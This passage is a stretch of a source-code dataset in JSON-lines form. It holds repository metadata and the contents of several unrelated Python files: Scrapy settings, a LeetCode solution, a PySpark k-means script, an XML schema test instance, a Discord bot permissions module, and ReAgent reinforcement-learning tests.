http://scrapy.readthedocs.org/en/latest/topics/downloader-middleware.html\n#DOWNLOADER_MIDDLEWARES = {\n#    'weather_sender.middlewares.MyCustomDownloaderMiddleware': 543,\n#}\n\n# Enable or disable extensions\n# See http://scrapy.readthedocs.org/en/latest/topics/extensions.html\n#EXTENSIONS = {\n#    'scrapy.telnet.TelnetConsole': None,\n#}\n\n# Configure item pipelines\n# See http://scrapy.readthedocs.org/en/latest/topics/item-pipeline.html\n#ITEM_PIPELINES = {\n#    'weather_sender.pipelines.SomePipeline': 300,\n#}\n\n# Enable and configure the AutoThrottle extension (disabled by default)\n# See http://doc.scrapy.org/en/latest/topics/autothrottle.html\n# NOTE: AutoThrottle will honour the standard settings for concurrency and delay\n#AUTOTHROTTLE_ENABLED=True\n# The initial download delay\n#AUTOTHROTTLE_START_DELAY=5\n# The maximum download delay to be set in case of high latencies\n#AUTOTHROTTLE_MAX_DELAY=60\n# Enable showing throttling stats for every response received:\n#AUTOTHROTTLE_DEBUG=False\n\n# Enable and configure HTTP caching (disabled by default)\n# See http://scrapy.readthedocs.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n#HTTPCACHE_ENABLED=True\n#HTTPCACHE_EXPIRATION_SECS=0\n#HTTPCACHE_DIR='httpcache'\n#HTTPCACHE_IGNORE_HTTP_CODES=[]\n#HTTPCACHE_STORAGE='scrapy.extensions.httpcache.FilesystemCacheStorage'\n"}
{"blob_id": "071a488316136020f20acc933c806a8a60b828de", "directory_id": "e8af875d0eba373499fe7d39522e471e3ce75a70", "path": "/Algorithms/find-the-duplicate-number.py", "content_id": "4589b6d17c8f5f7b23e7454f92cdcc56e46ea890", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "feilniu/LeetCode", "snapshot_id": "bd2d7933c84f5e4c01aa5954e5fa6fca8e238547", "revision_id": "e07b85a4121f2665393f1176befbdbe06f1e1ad0", "branch_name": "refs/heads/master", "visit_date": "2021-01-10 11:28:01.279944", "revision_date": "2016-02-18 09:13:08", "committer_date": "2016-02-18 09:13:08", "github_id": "50965190", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "824", "extension": "py", "content": "class Solution(object):\n    def findDuplicate(self, nums):\n        \"\"\"\n        :type nums: List[int]\n        :rtype: int\n        \"\"\"\n        lower = 0\n        upper = len(nums) - 1\n        while lower < upper:\n            middle = lower + (upper - lower) // 2\n            count = sum((1 for n in nums if n <= middle))\n            if count <= middle:\n                lower = middle + 1\n            else:\n                upper = middle\n        return lower\n\ntestCases = [\n        [[1,2,3,3,4], 3],\n        [[1,3,5,7,2,4,6,8,9,5], 5],\n        [[1,1], 1],\n        [[2,2,2,2,2], 2],\n        [[1,2,3,3,3], 3],\n        [[1,4,3,3,3], 3],\n        [[1,3,2,3,4,3,5], 3]\n        ]\ns = Solution()\nfor tc in testCases:\n    result = s.findDuplicate(tc[0])\n    passed = result == tc[1]\n    if not passed:\n        print(tc, result, passed)\n\n"}
{"blob_id": "69b58b6a82e190e355c4ebe43955feb65d673da8", "directory_id": "70d07f3a134723467f3bb6c4377528fbf2f3004e", "path": "/Models/kMeans.py", "content_id": "c0bf1837168e50636d324674cf69dbd22e316899", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "mangeshb1/CMPT733Big_Data_YELP", "snapshot_id": "64c092919e3a680d6b4a8d93a6880c70c370bceb", "revision_id": "6494c7ca7a15e80ee118553d4f506b51ea8e8d4c", "branch_name": "refs/heads/master", "visit_date": "2021-01-18 13:12:59.506447", "revision_date": "2016-04-05 00:45:33", "committer_date": "2016-04-05 00:45:33", "github_id": "68672224", "star_events_count": "2", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "4099", "extension": "py", "content": "# Take the groupby dataset\n# And perfrom k means clustering to separate the data into 3 groups\n# Then discern the 3 groups in high, low, and medium risk classes\n\nfrom pyspark.mllib.clustering import KMeans, KMeansModel\nfrom numpy import array\nfrom math import sqrt\nfrom pyspark.sql import SQLContext\nfrom pyspark.sql.types import *\nfrom pyspark import SparkContext,SparkConf\nfrom pyspark.sql.functions import udf, col\nfrom pyspark.mllib.stat import Statistics\n\nconf = SparkConf().setAppName(\"KMeans\")\nsc = SparkContext(conf=conf)\nsqlContext = SQLContext(sc)\n\n#dfModelDataAll = sqlContext.read.format('com.databricks.spark.csv').options(header='true', inferschema='true').load('/home/ub51/SFU/733Project/Data/model.csv')\n#dfModelDataAll.show()\n# Load and parse the data\n\n#groupby data\ndf_loc = \"../sentiment_analysis/aggregated_senti.parquet\"\ndfModelDataAll = sqlContext.parquetFile(df_loc)\n\n#yelp business data set to get yelp score\nyelp_bus_loc = \"../yelp_data/yelp_academic_dataset_business.json\"\nyelp_df = sqlContext.read.json(yelp_bus_loc).select(\"business_id\", \"stars\")\n\n#join to get yelp score\ndfModelDataAll = dfModelDataAll.join(yelp_df, \\\n                   yelp_df.business_id==dfModelDataAll.yelp_id)\\\n                   .drop(yelp_df.business_id)\n\n#dfModelDataAll.show(20, False)\n#raise SystemExit\n\n#select k means parameters\ntrainingData = dfModelDataAll.select('stars', 'avg_anger', 'avg_disgust', \\\n                        'avg_fear', 'avg_joy', 'avg_sadness',\\\n                        'avg_agree', 'avg_emotion', 'vio_per_year',\\\n                        'four_scale_stars', 'five_scale_stars')\n\n#trainParse = trainingData.map(lambda l:[l[0], l[1], l[2], l[3], \\\n#                                        l[4], l[5], l[6], l[7], l[8], \\\n#                                            l[9], l[10]])\n\nptWithYelp = dfModelDataAll.map(lambda l:(l.yelp_id, l.lv_id, l.name,\\\n                                          [l.stars,\\\n                                          1.0 * l.five_scale_stars,\\\n                                          1.0 * l.four_scale_stars,\\\n                                          l.avg_disgust,\\\n                                          l.avg_agree,\\\n                                          l.avg_emotion,\\\n                                          l.avg_sadness,\\\n                                          l.avg_anger,\\\n                                          l.avg_joy]))\n\n#adding fear and vio_per_year makes things worse\n\ntrainParse = ptWithYelp.map(lambda (yid, lid, n, vec): vec)\nsummary = Statistics.colStats(trainParse)\nprint(\"MEAN: \", summary.mean())\nprint(\"STD: \", summary.variance())\n#raise SystemExit\n\n\n# Build the model (cluster the data)\nclusters = KMeans.train(trainParse, 3, maxIterations=100)\n\n# Evaluate clustering by computing Within Set Sum of Squared Errors\ndef error(point):\n    center = clusters.centers[clusters.predict(point)]\n    return sqrt(sum([x**2 for x in (point - center)]))\n\nWSSSE = trainParse.map(lambda point: error(point)).reduce(lambda x, y: x + y)\nprint(\"Within Set Sum of Squared Error = \" + str(WSSSE))\n\n\n#predictUDF = udf(lambda x: modelBC.value.predict(x), StringType())\n#dfModelDataAll = df1.withColumn(\"prediction\", predictUDF(df1.features)).cache()\n\nmyFinalData = ptWithYelp.map(lambda (yid, lvid, n, vec):(yid, lvid, n, vec,\\\n                                                 clusters.predict(vec)))\n\nmyFinalData = sqlContext.createDataFrame(myFinalData,\\\n                     ['yelp_id', 'lv_id', 'name', 'vector', 'cluster'])\n\n# Save and load model\n#clusters.save(sc, \"myModelPath\")\n#sameModel = KMeansModel.load(sc, \"myModelPath\")\nmyFinalData.write.parquet(\"lv_cluster_long.parquet\", mode='overwrite')\n\na1 = myFinalData.where(myFinalData.cluster==0)\na1.show(4, False)\na2 = myFinalData.where(myFinalData.cluster==1)\na2.show(4, False)\na3 = myFinalData.where(myFinalData.cluster==2)\na3.show(4, False)\na4 = myFinalData.where(myFinalData.cluster==3)\na4.show(4, False)\na5 = myFinalData.where(myFinalData.cluster==4)\na5.show(4, False)\n\nprint (\"COUNT LAST: \", a1.count(), a2.count(), a3.count(), a4.count(), a5.count())\n"}
{"blob_id": "e2a29335db0e4737a1fd3a1738949e367ce52aa5", "directory_id": "ad13583673551857615498b9605d9dcab63bb2c3", "path": "/output/instances/nistData/list/NCName/Schema+Instance/NISTXML-SV-IV-list-NCName-maxLength-1-4.py", "content_id": "a8f562f2c0ef5ae11ec1d55ae0d2e85fbca3f80a", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "tefra/xsdata-w3c-tests", "snapshot_id": "397180205a735b06170aa188f1f39451d2089815", "revision_id": "081d0908382a0e0b29c8ee9caca6f1c0e36dd6db", "branch_name": "refs/heads/main", "visit_date": "2023-08-03 04:25:37.841917", "revision_date": "2023-07-29 17:10:13", "committer_date": "2023-07-30 12:11:13", "github_id": "239622251", "star_events_count": "2", "fork_events_count": "0", "gha_license_id": "MIT", "gha_event_created_at": "2023-07-25 14:19:04", "gha_created_at": "2020-02-10 21:59:47", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "520", "extension": "py", "content": "from output.models.nist_data.list_pkg.ncname.schema_instance.nistschema_sv_iv_list_ncname_max_length_1_xsd.nistschema_sv_iv_list_ncname_max_length_1 import NistschemaSvIvListNcnameMaxLength1\n\n\nobj = NistschemaSvIvListNcnameMaxLength1(\n    value=[\n        \"ythose.000.libraries_and-can-language-mus\",\n        \"iof-and.will.the-object-the-of.and-would_\",\n        \"xa_particularly_to-filter_implementations\",\n        \"_a-signature-use-supply-partnerships_be.i\",\n        \"tembedded-implementation.heterogeneous-an\",\n    ]\n)\n"}
{"blob_id": "571ce52378aabb5a31adb82893ceda0595061814", "directory_id": "40eefaf27de3d67fd7a3ec07bb38788ad0018167", "path": "/futaba/permissions.py", "content_id": "1fe235d71ff53fee536ca25bcf362e2df390a7e0", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "JoshuaS3/futaba", "snapshot_id": "d86dbabfce2a2a225f00c24d2e8618c5cc6725d2", "revision_id": "f39f03e20d8f487b466c67b00de3e27f8a368c23", "branch_name": "refs/heads/master", "visit_date": "2023-03-29 23:19:45.383357", "revision_date": "2023-03-08 04:54:17", "committer_date": "2023-03-08 04:55:10", "github_id": "235903013", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "MIT", "gha_event_created_at": "2020-01-23 22:56:48", "gha_created_at": "2020-01-23 22:56:47", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5101", "extension": "py", "content": "#\n# permissions.py\n#\n# futaba - A Discord Mod bot for the Programming server\n# Copyright (c) 2017-2020 Jake Richardson, Ammon Smith, jackylam5\n#\n# futaba is available free of charge under the terms of the MIT\n# License. You are free to redistribute and/or modify it under those\n# terms. It is distributed in the hopes that it will be useful, but\n# WITHOUT ANY WARRANTY. See the LICENSE file for more details.\n#\n\n\"\"\"\nHolds custom decorators to check permissions for commands.\nAlso has other helper commands for checking permissions within a guild.\n\"\"\"\n\nimport discord\nfrom discord.ext import commands\n\nfrom futaba.str_builder import StringBuilder\n\n__all__ = [\n    \"elevated_role_perms\",\n    \"elevated_role_embed\",\n    \"is_admin_perm\",\n    \"is_mod_perm\",\n    \"owner_perm\",\n    \"admin_perm\",\n    \"mod_perm\",\n    \"has_perm\",\n    \"check_owner\",\n    \"check_admin\",\n    \"check_mod\",\n    \"check_perm\",\n]\n\nELEVATED_PERMISSION_NAMES = (\n    \"administrator\",\n    \"mention_everyone\",\n    \"manage_messages\",\n    \"manage_channels\",\n    \"manage_guild\",\n    \"mute_members\",\n    \"deafen_members\",\n    \"move_members\",\n    \"kick_members\",\n    \"ban_members\",\n    \"manage_nicknames\",\n    \"manage_roles\",\n    \"manage_emojis\",\n)\n\n\ndef elevated_role_perms(guild, role):\n    \"\"\"\n    Outputs a list of permissions and channels where this role has elevated permissions.\n    If an empty list is returned it is \"safe\" to apply.\n    \"\"\"\n\n    # Format [(guild or channel, perm_name)...]\n    elevated = []\n\n    perms = role.permissions\n    for perm in ELEVATED_PERMISSION_NAMES:\n        if getattr(perms, perm) is True:\n            elevated.append((guild, perm))\n            if perm == \"administrator\":\n                break\n\n    for channel in guild.channels:\n        perms = channel.overwrites_for(role)\n        for perm in ELEVATED_PERMISSION_NAMES:\n            if getattr(perms, perm) is True:\n                elevated.append((channel, perm))\n                if perm == \"administrator\":\n                    break\n\n    return elevated\n\n\ndef elevated_role_embed(guild, role, level):\n    \"\"\"\n    Takes the result of elevated_role_perms() and produces an embed listing the permissions.\n    The parameter level must be 'warning' or 'error'.\n    \"\"\"\n\n    elevated = elevated_role_perms(guild, role)\n    if not elevated:\n        return None\n\n    if level == \"warning\":\n        colour = discord.Colour.gold()\n        icon = \"\\N{WARNING SIGN}\"\n    elif level == \"error\":\n        colour = discord.Colour.red()\n        icon = \"\\N{NO ENTRY}\"\n    else:\n        raise ValueError(f\"Unknown severity level: '{level}'\")\n\n    embed = discord.Embed()\n    embed.colour = colour\n    embed.title = f\"{icon} Role gives elevated permissions\"\n    descr = StringBuilder()\n    for location, perm in elevated:\n        perm = perm.replace(\"_\", \" \").title()\n        if isinstance(location, discord.Guild):\n            descr.writeln(f\"- {perm}\")\n        elif isinstance(location, discord.TextChannel):\n            descr.writeln(f\"- {perm} in {location.mention}\")\n        else:\n            descr.writeln(f\"- {perm} in {location.name}\")\n    embed.description = str(descr)\n    return embed\n\n\ndef is_admin_perm(perm: discord.Permissions):\n    \"\"\"Used to check is user has the manage_guild permission\"\"\"\n\n    return perm.manage_guild\n\n\ndef is_mod_perm(perm: discord.Permissions):\n    \"\"\"Used to check is user has the manage_channels permission\"\"\"\n\n    return perm.manage_channels\n\n\ndef owner_perm(ctx: commands.Context):\n    \"\"\"Check if user is a owner of the bot from config\"\"\"\n\n    return ctx.author.id in ctx.bot.config.owner_ids\n\n\ndef admin_perm(ctx: commands.Context):\n    \"\"\"Check if the given member is an admin.\"\"\"\n\n    if isinstance(ctx.channel, discord.abc.PrivateChannel):\n        return False\n\n    return is_admin_perm(ctx.channel.permissions_for(ctx.author))\n\n\ndef mod_perm(ctx: commands.Context):\n    \"\"\"Check if the given member is a moderator.\"\"\"\n\n    if isinstance(ctx.channel, discord.abc.PrivateChannel):\n        return False\n\n    return is_mod_perm(ctx.channel.permissions_for(ctx.author))\n\n\ndef has_perm(ctx: commands.Context, name: str):\n    \"\"\"Check if the given member has the specified permission.\"\"\"\n\n    if isinstance(ctx.channel, discord.abc.PrivateChannel):\n        return False\n\n    perms = ctx.channel.permissions_for(ctx.author)\n    return getattr(perms, name)\n\n\ndef check_owner():\n    \"\"\"Check if user is a owner\"\"\"\n\n    return commands.check(owner_perm)\n\n\ndef check_admin():\n    \"\"\"Check if user is admin or higher\"\"\"\n\n    def checkperm(ctx):\n        return owner_perm(ctx) or admin_perm(ctx)\n\n    return commands.check(checkperm)\n\n\ndef check_mod():\n    \"\"\"Check if user is moderator or higher\"\"\"\n\n    def checkperm(ctx):\n        return owner_perm(ctx) or admin_perm(ctx) or mod_perm(ctx)\n\n    return commands.check(checkperm)\n\n\ndef check_perm(name):\n    \"\"\"Check if user has the given permission\"\"\"\n\n    perms = discord.Permissions()\n    if not hasattr(perms, name):\n        raise AttributeError(f\"No such permission name: {name}\")\n\n    def checkperm(ctx):\n        return has_perm(ctx, name)\n\n    return commands.check(checkperm)\n"}
{"blob_id": "a69a9f68f25096e15e868d3dff4bcf6438075a19", "directory_id": "d1ab7452d6449a4d6b99177a2c1d44d3231283c5", "path": "/reagent/gym/tests/test_gym.py", "content_id": "e24b00f736409f7cfff6788607410c22c0d570ed", "detected_licenses": "['BSD-3-Clause']", "license_type": "permissive", "repo_name": "ojaswa-privado/ReAgent", "snapshot_id": "67e3fb7d52b39e6feb4ab4537691d20c99fde323", "revision_id": "e990e66f69369cbe89212e334191180716c9bf4e", "branch_name": "refs/heads/master", "visit_date": "2023-03-24 22:20:52.342277", "revision_date": "2021-03-18 12:38:23", "committer_date": "2021-03-18 12:38:23", "github_id": "348598068", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "BSD-3-Clause", "gha_event_created_at": "2021-03-18 12:38:24", "gha_created_at": "2021-03-17 06:05:53", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "13455", "extension": "py", "content": "#!/usr/bin/env python3\n# Copyright (c) Facebook, Inc. and its affiliates. All rights reserved.\nimport logging\nimport os\nimport pprint\nimport unittest\nfrom typing import Optional, Dict, Any\n\nimport numpy as np\nimport pytest\nimport pytorch_lightning as pl\nimport torch\nfrom parameterized import parameterized\nfrom reagent.core.tensorboardX import summary_writer_context\nfrom reagent.gym.agents.agent import Agent\nfrom reagent.gym.agents.post_episode import train_post_episode\nfrom reagent.gym.datasets.episodic_dataset import (\n    EpisodicDataset,\n)\nfrom reagent.gym.datasets.replay_buffer_dataset import ReplayBufferDataset\nfrom reagent.gym.envs import Env__Union\nfrom reagent.gym.envs.env_wrapper import EnvWrapper\nfrom reagent.gym.policies.policy import Policy\nfrom reagent.gym.runners.gymrunner import evaluate_for_n_episodes, run_episode\nfrom reagent.gym.types import PostEpisode, PostStep\nfrom reagent.gym.utils import build_normalizer, fill_replay_buffer\nfrom reagent.replay_memory.circular_replay_buffer import ReplayBuffer\nfrom reagent.test.base.horizon_test_base import HorizonTestBase\nfrom reagent.training.trainer import Trainer\nfrom reagent.workflow.model_managers.union import ModelManager__Union\nfrom reagent.workflow.types import RewardOptions\nfrom torch.utils.tensorboard import SummaryWriter\nfrom tqdm import trange\n\n\n# for seeding the environment\nSEED = 0\n# exponential moving average parameter for tracking reward progress\nREWARD_DECAY = 0.8\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.INFO)\n\n\n\"\"\"\nPut on-policy gym tests here in the format (test name, path to yaml config).\nFormat path to be: \"configs/<env_name>/<model_name>_<env_name>_online.yaml.\"\nNOTE: These tests should ideally finish quickly (within 10 minutes) since they are\nunit tests which are run many times.\n\"\"\"\nREPLAY_BUFFER_GYM_TESTS = [\n    (\"Discrete CRR Cartpole\", \"configs/cartpole/discrete_crr_cartpole_online.yaml\"),\n    (\"Discrete DQN Cartpole\", \"configs/cartpole/discrete_dqn_cartpole_online.yaml\"),\n    (\"Discrete C51 Cartpole\", \"configs/cartpole/discrete_c51_cartpole_online.yaml\"),\n    (\"Discrete QR Cartpole\", \"configs/cartpole/discrete_qr_cartpole_online.yaml\"),\n    (\n        \"Discrete DQN Open Gridworld\",\n        \"configs/open_gridworld/discrete_dqn_open_gridworld.yaml\",\n    ),\n    (\"SAC Pendulum\", \"configs/pendulum/sac_pendulum_online.yaml\"),\n    (\"Continuous CRR Pendulum\", \"configs/pendulum/continuous_crr_pendulum_online.yaml\"),\n    (\"TD3 Pendulum\", \"configs/pendulum/td3_pendulum_online.yaml\"),\n    (\"Parametric DQN Cartpole\", \"configs/cartpole/parametric_dqn_cartpole_online.yaml\"),\n    (\n        \"Parametric SARSA Cartpole\",\n        \"configs/cartpole/parametric_sarsa_cartpole_online.yaml\",\n    ),\n    (\n        \"Sparse DQN Changing Arms\",\n        \"configs/sparse/discrete_dqn_changing_arms_online.yaml\",\n    ),\n    (\"SlateQ RecSim\", \"configs/recsim/slate_q_recsim_online.yaml\"),\n    (\"PossibleActionsMask DQN\", \"configs/functionality/dqn_possible_actions_mask.yaml\"),\n]\n\nONLINE_EPISODE_GYM_TESTS = [\n    (\n        \"REINFORCE Cartpole online\",\n        \"configs/cartpole/discrete_reinforce_cartpole_online.yaml\",\n    ),\n    (\n        \"PPO Cartpole online\",\n        \"configs/cartpole/discrete_ppo_cartpole_online.yaml\",\n    ),\n]\n\n\ncurr_dir = os.path.dirname(__file__)\n\n\nclass TestGym(HorizonTestBase):\n    # pyre-fixme[16]: Module `parameterized` has no attribute `expand`.\n    @parameterized.expand(REPLAY_BUFFER_GYM_TESTS)\n    def test_replay_buffer_gym_cpu(self, name: str, config_path: str):\n        logger.info(f\"Starting {name} on CPU\")\n        self.run_from_config(\n            run_test=run_test_replay_buffer,\n            config_path=os.path.join(curr_dir, config_path),\n            use_gpu=False,\n        )\n        logger.info(f\"{name} passes!\")\n\n    # pyre-fixme[16]: Module `parameterized` has no attribute `expand`.\n    @parameterized.expand(REPLAY_BUFFER_GYM_TESTS)\n    @pytest.mark.serial\n    # pyre-fixme[56]: Argument `not torch.cuda.is_available()` to decorator factory\n    #  `unittest.skipIf` could not be resolved in a global scope.\n    @unittest.skipIf(not torch.cuda.is_available(), \"CUDA not available\")\n    def test_replay_buffer_gym_gpu(self, name: str, config_path: str):\n        logger.info(f\"Starting {name} on GPU\")\n        self.run_from_config(\n            run_test=run_test_replay_buffer,\n            config_path=os.path.join(curr_dir, config_path),\n            use_gpu=True,\n        )\n        logger.info(f\"{name} passes!\")\n\n    # pyre-fixme[16]: Module `parameterized` has no attribute `expand`.\n    @parameterized.expand(ONLINE_EPISODE_GYM_TESTS)\n    def test_online_episode_gym_cpu(self, name: str, config_path: str):\n        logger.info(f\"Starting {name} on CPU\")\n        self.run_from_config(\n            run_test=run_test_online_episode,\n            config_path=os.path.join(curr_dir, config_path),\n            use_gpu=False,\n        )\n        logger.info(f\"{name} passes!\")\n\n\ndef train_policy(\n    env: EnvWrapper,\n    training_policy: Policy,\n    num_train_episodes: int,\n    post_step: Optional[PostStep] = None,\n    post_episode: Optional[PostEpisode] = None,\n    use_gpu: bool = False,\n) -> np.ndarray:\n    device = torch.device(\"cuda\") if use_gpu else torch.device(\"cpu\")\n    agent = Agent.create_for_env(\n        env,\n        policy=training_policy,\n        post_transition_callback=post_step,\n        post_episode_callback=post_episode,\n        device=device,\n    )\n    running_reward = 0\n    writer = SummaryWriter()\n    with summary_writer_context(writer):\n        train_rewards = []\n        with trange(num_train_episodes, unit=\" epoch\") as t:\n            for i in t:\n                # Note: run_episode also performs a training step for the agent, if specified in post_step\n                trajectory = run_episode(env=env, agent=agent, mdp_id=i, max_steps=200)\n                ep_reward = trajectory.calculate_cumulative_reward()\n                train_rewards.append(ep_reward)\n                running_reward *= REWARD_DECAY\n                running_reward += (1 - REWARD_DECAY) * ep_reward\n                t.set_postfix(reward=running_reward)\n\n    logger.info(\"============Train rewards=============\")\n    logger.info(train_rewards)\n    logger.info(f\"average: {np.mean(train_rewards)};\\tmax: {np.max(train_rewards)}\")\n    return np.array(train_rewards)\n\n\ndef eval_policy(\n    env: EnvWrapper,\n    serving_policy: Policy,\n    num_eval_episodes: int,\n    serving: bool = True,\n) -> np.ndarray:\n    agent = (\n        Agent.create_for_env_with_serving_policy(env, serving_policy)\n        if serving\n        else Agent.create_for_env(env, serving_policy)\n    )\n\n    eval_rewards = evaluate_for_n_episodes(\n        n=num_eval_episodes,\n        env=env,\n        agent=agent,\n        max_steps=env.max_steps,\n        num_processes=1,\n    ).squeeze(1)\n\n    logger.info(\"============Eval rewards==============\")\n    logger.info(eval_rewards)\n    mean_eval = np.mean(eval_rewards)\n    logger.info(f\"average: {mean_eval};\\tmax: {np.max(eval_rewards)}\")\n    return np.array(eval_rewards)\n\n\ndef identity_collate(batch):\n    assert isinstance(batch, list) and len(batch) == 1, f\"Got {batch}\"\n    return batch[0]\n\n\ndef run_test_replay_buffer(\n    env: Env__Union,\n    model: ModelManager__Union,\n    replay_memory_size: int,\n    train_every_ts: int,\n    train_after_ts: int,\n    num_train_episodes: int,\n    passing_score_bar: float,\n    num_eval_episodes: int,\n    use_gpu: bool,\n    minibatch_size: Optional[int] = None,\n):\n    \"\"\"\n    Run an online learning test with a replay buffer. The replay buffer is pre-filled, then the training starts.\n    Each transition is added to the replay buffer immediately after it takes place.\n    \"\"\"\n    env = env.value\n    # pyre-fixme[16]: Module `pl` has no attribute `seed_everything`.\n    pl.seed_everything(SEED)\n    env.seed(SEED)\n    env.action_space.seed(SEED)\n\n    normalization = build_normalizer(env)\n    logger.info(f\"Normalization is: \\n{pprint.pformat(normalization)}\")\n\n    manager = model.value\n    trainer = manager.initialize_trainer(\n        use_gpu=use_gpu,\n        reward_options=RewardOptions(),\n        normalization_data_map=normalization,\n    )\n    training_policy = manager.create_policy(serving=False)\n\n    # pyre-fixme[16]: Module `pl` has no attribute `LightningModule`.\n    if not isinstance(trainer, pl.LightningModule):\n        if minibatch_size is None:\n            minibatch_size = trainer.minibatch_size\n        assert minibatch_size == trainer.minibatch_size\n\n    assert minibatch_size is not None\n\n    replay_buffer = ReplayBuffer(\n        replay_capacity=replay_memory_size, batch_size=minibatch_size\n    )\n\n    device = torch.device(\"cuda\") if use_gpu else torch.device(\"cpu\")\n    # first fill the replay buffer using random policy\n    train_after_ts = max(train_after_ts, minibatch_size)\n    fill_replay_buffer(\n        env=env, replay_buffer=replay_buffer, desired_size=train_after_ts\n    )\n\n    agent = Agent.create_for_env(env, policy=training_policy, device=device)\n    # TODO: Simplify this setup by creating LightningDataModule\n    dataset = ReplayBufferDataset.create_for_trainer(\n        trainer,\n        env,\n        agent,\n        replay_buffer,\n        batch_size=minibatch_size,\n        training_frequency=train_every_ts,\n        num_episodes=num_train_episodes,\n        max_steps=200,\n        device=device,\n    )\n    data_loader = torch.utils.data.DataLoader(dataset, collate_fn=identity_collate)\n    # pyre-fixme[16]: Module `pl` has no attribute `Trainer`.\n    pl_trainer = pl.Trainer(max_epochs=1, gpus=int(use_gpu))\n    # Note: the fit() function below also evaluates the agent along the way\n    # and adds the new transitions to the replay buffer, so it is training\n    # on incrementally larger and larger buffers.\n    pl_trainer.fit(trainer, data_loader)\n\n    # TODO: Also check train_reward\n\n    serving_policy = manager.create_policy(serving=True)\n\n    eval_rewards = eval_policy(env, serving_policy, num_eval_episodes, serving=True)\n    assert (\n        eval_rewards.mean() >= passing_score_bar\n    ), f\"Eval reward is {eval_rewards.mean()}, less than < {passing_score_bar}.\\n\"\n\n\ndef run_test_online_episode(\n    env: Env__Union,\n    model: ModelManager__Union,\n    num_train_episodes: int,\n    passing_score_bar: float,\n    num_eval_episodes: int,\n    use_gpu: bool,\n):\n    \"\"\"\n    Run an online learning test. At the end of each episode training is run on the trajectory.\n    \"\"\"\n    env = env.value\n    # pyre-fixme[16]: Module `pl` has no attribute `seed_everything`.\n    pl.seed_everything(SEED)\n    env.seed(SEED)\n    env.action_space.seed(SEED)\n\n    normalization = build_normalizer(env)\n    logger.info(f\"Normalization is: \\n{pprint.pformat(normalization)}\")\n\n    manager = model.value\n    trainer = manager.initialize_trainer(\n        use_gpu=use_gpu,\n        reward_options=RewardOptions(),\n        normalization_data_map=normalization,\n    )\n    policy = manager.create_policy(serving=False)\n\n    device = torch.device(\"cuda\") if use_gpu else torch.device(\"cpu\")\n\n    agent = Agent.create_for_env(env, policy, device=device)\n\n    # pyre-fixme[16]: Module `pl` has no attribute `LightningModule`.\n    if isinstance(trainer, pl.LightningModule):\n        # pyre-fixme[16]: Module `pl` has no attribute `Trainer`.\n        pl_trainer = pl.Trainer(max_epochs=1, gpus=int(use_gpu), deterministic=True)\n        dataset = EpisodicDataset(\n            env=env, agent=agent, num_episodes=num_train_episodes, seed=SEED\n        )\n        pl_trainer.fit(trainer, dataset)\n    else:\n        post_episode_callback = train_post_episode(env, trainer, use_gpu)\n        _ = train_policy(\n            env,\n            policy,\n            num_train_episodes,\n            post_step=None,\n            post_episode=post_episode_callback,\n            use_gpu=use_gpu,\n        )\n\n    eval_rewards = evaluate_for_n_episodes(\n        n=num_eval_episodes,\n        env=env,\n        agent=agent,\n        max_steps=env.max_steps,\n        num_processes=1,\n    ).squeeze(1)\n    assert (\n        eval_rewards.mean() >= passing_score_bar\n    ), f\"Eval reward is {eval_rewards.mean()}, less than < {passing_score_bar}.\\n\"\n\n\ndef run_test_episode_buffer(\n    env: EnvWrapper,\n    policy: Policy,\n    trainer: Trainer,\n    num_train_episodes: int,\n    passing_score_bar: float,\n    num_eval_episodes: int,\n    use_gpu: bool = False,\n):\n    # pyre-fixme[16]: Module `pl` has no attribute `seed_everything`.\n    pl.seed_everything(SEED)\n    env.seed(SEED)\n    env.action_space.seed(SEED)\n\n    post_episode_callback = train_post_episode(env, trainer, use_gpu)\n    train_rewards = train_policy(\n        env,\n        policy,\n        num_train_episodes,\n        post_step=None,\n        post_episode=post_episode_callback,\n        use_gpu=use_gpu,\n    )\n\n    # Check whether the max score passed the score bar; we explore during training\n    # the return could be bad (leading to flakiness in C51 and QRDQN).\n    assert np.max(train_rewards) >= passing_score_bar, (\n        f\"max reward ({np.max(train_rewards)}) after training for \"\n        f\"{len(train_rewards)} episodes is less than < {passing_score_bar}.\\n\"\n    )\n\n    serving_policy = policy\n    eval_rewards = eval_policy(env, serving_policy, num_eval_episodes, serving=False)\n    assert (\n        eval_rewards.mean() >= passing_score_bar\n    ), f\"Eval reward is {eval_rewards.mean()}, less than < {passing_score_bar}.\\n\"\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n"}
{"blob_id": "83a4571620e5463bd6609e22f9c29e9d47dcf3d2", "directory_id": "4e4d0c275d2b11ee2d9d45d404fd7607499dbba9", "path": "/python/KTMaterialXTools/ScriptMaterialX.py", "content_id": "e287dbfeca9e8a4c097eec2fe1db241c5ea99ad5", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "iceprincefounder/KTMaterialXTools", "snapshot_id": "99fb798b1a270395d3a5cc78b5066e70a8ab97f7", "revision_id": "f2e38cb4b734bf0a1d27cdf1e93aeb22c268a65e", "branch_name": "refs/heads/master", "visit_date": "2020-04-24 13:19:27.526850", "revision_date": "2019-03-14 06:26:35", "committer_date": "2019-03-14 06:26:35", "github_id": "171983972", "star_events_count": "35", "fork_events_count": "3", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "13102", "extension": "py", "content": "import os,sys\nimport logging\nlog = 